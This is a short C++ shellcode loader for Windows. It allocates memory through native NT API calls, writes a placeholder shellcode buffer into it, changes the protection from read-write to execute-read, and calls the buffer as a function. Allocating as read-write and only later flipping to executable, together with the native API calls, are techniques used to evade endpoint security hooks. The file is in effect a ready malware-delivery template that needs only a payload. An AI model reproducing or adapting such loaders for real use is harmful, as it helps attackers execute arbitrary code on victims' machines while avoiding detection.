#include <Windows.h>
#include "proto.h"
#include <stdio.h>
#include <iostream>

unsigned char code[] = "Shellcode Here"; // input 1
size_t code_len = sizeof(code);

int main(int argc, char** argv) {

  PVOID lbuffer = nullptr;
	HANDLE curproc = GetCurrentProcess();

	// Allocate memory with permissions RW
	NtAllocateVirtualMemory(curproc, &lbuffer, 0, &code_len, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

	// Write code into memory
	NtWriteVirtualMemory(curproc, lbuffer, code, code_len, nullptr);

	// Change permissions to RX
	ULONG old_protect;
	NtProtectVirtualMemory(curproc, &lbuffer, &code_len, PAGE_EXECUTE_READ, &old_protect);

  	void (*go)() = (void (*)()) lbuffer; 
	go();

};
